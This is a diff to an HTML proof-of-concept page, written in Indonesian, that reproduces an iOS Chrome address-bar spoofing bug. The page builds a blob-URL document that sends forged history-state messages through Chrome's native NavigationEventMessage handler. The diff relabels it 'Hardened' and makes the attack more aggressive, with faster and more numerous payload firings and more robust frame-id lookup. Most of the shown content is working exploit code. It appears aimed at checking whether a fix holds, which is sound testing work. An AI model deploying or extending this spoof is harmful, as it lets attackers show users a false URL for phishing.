@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Reproduction - iOS Chrome Blob History Spoof</title>
+    <title>PoC Hardened Reproduction - iOS Chrome Blob History Spoof</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -48,13 +48,13 @@
 </head>
 <body>
 
-    <h1>iOS Chrome History Spoof - Reproduction PoC</h1>
-    <p>Halaman ini digunakan untuk prosedur ulang validasi <code>IsHistoryStateChangeValid</code> pada iOS Chrome berdasarkan [Chromium Review Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494).</p>
+    <h1>iOS Chrome History Spoof - Hardened Reproduction PoC</h1>
+    <p>Halaman ini menguji validasi <code>IsHistoryStateChangeValid</code> pada [Chromium Review Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494) dengan payload blob yang diperkuat.</p>
 
     <div class="card">
-        <h3>1. Blob Launcher</h3>
-        <p>Membuat objek blob terenkapsulasi untuk memicu manipulasi *history state* lintas asal.</p>
-        <button id="launch-btn">Mulai Prosedur Ulang</button>
+        <h3>1. Hardened Blob Launcher</h3>
+        <p>Membuat objek blob terenkapsulasi untuk memicu manipulasi *history state* lintas asal secara agresif.</p>
+        <button id="launch-btn">Jalankan Hardened PoC</button>
         <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
@@ -69,13 +69,13 @@
     // Template HTML payload yang dimasukkan ke dalam Blob URL
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Example Domain - Reproduction Target</title>
+<title>Example Domain - Hardened Reproduction Target</title>
 <style>
   body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
   h2 { color: #b31412; }
   pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Blob Sandbox Active</h2>
+<h2>Hardened Blob Sandbox Active</h2>
 <p>Asal Dokumen (Origin): <code id="origin"></code></p>
 <p>URL Saat Ini: <code id="cur-url"></code></p>
 <pre id="blob-log"></pre>
@@ -83,12 +83,12 @@
 (function(){
   function bLog(msg) {
     document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[ReproPoC] ' + msg); } catch(e){}
+    try { console.log('[HardenedRepro] ' + msg); } catch(e){}
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
   document.getElementById('cur-url').textContent = location.href;
-  bLog('Blob dokumen berhasil dimuat.');
+  bLog('Hardened blob dokumen berhasil dimuat.');
 
   var mh = (window.webkit && window.webkit.messageHandlers) || {};
   if (!mh.NavigationEventMessage) {
@@ -97,11 +97,12 @@
   }
   bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
 
-  // Pengambilan frame_id dengan berbagai opsi fallback
+  // Pengambilan frame_id yang diperkuat dengan multi-fallback
   var getFid = function() {
     try {
       if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-        return window.__gCrWeb.getFrameId();
+        var id = window.__gCrWeb.getFrameId();
+        if (id) return id;
       }
     } catch(e) {}
 
@@ -144,25 +145,26 @@
     }
   };
 
-  // Eksekusi beruntun dengan interval waktu
+  // Eksekusi beruntun dengan interval waktu untuk menjamin penanganan native
   firePayload(1);
-  setTimeout(function(){ firePayload(2); }, 100);
-  setTimeout(function(){ firePayload(3); }, 300);
-  setTimeout(function(){ firePayload(4); }, 600);
+  setTimeout(function(){ firePayload(2); }, 80);
+  setTimeout(function(){ firePayload(3); }, 200);
+  setTimeout(function(){ firePayload(4); }, 450);
+  setTimeout(function(){ firePayload(5); }, 800);
 
   setTimeout(function(){
     bLog('\\n--- EVALUASI PROSEDUR ---');
     bLog('Periksa Address Bar Anda.');
     bLog('Jika menampilkan "' + "${VICTIM}" + '": Perilaku rentan terekam.');
     bLog('Jika tetap menampilkan URL blob: Perbaikan aktif dan menolak state change.');
-  }, 1000);
+  }, 1200);
 })();
 <\/script>`;
 
-    function startReproductionPoC() {
+    function startHardenedRepro() {
         try {
             const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Mempersiapkan objek blob...\n";
+            diag.textContent += "[*] Mempersiapkan objek blob terenkapsulasi...\n";
             
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
@@ -178,7 +180,7 @@
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', startReproductionPoC);
+    document.getElementById('launch-btn').addEventListener('click', startHardenedRepro);
 </script>
 
 </body>
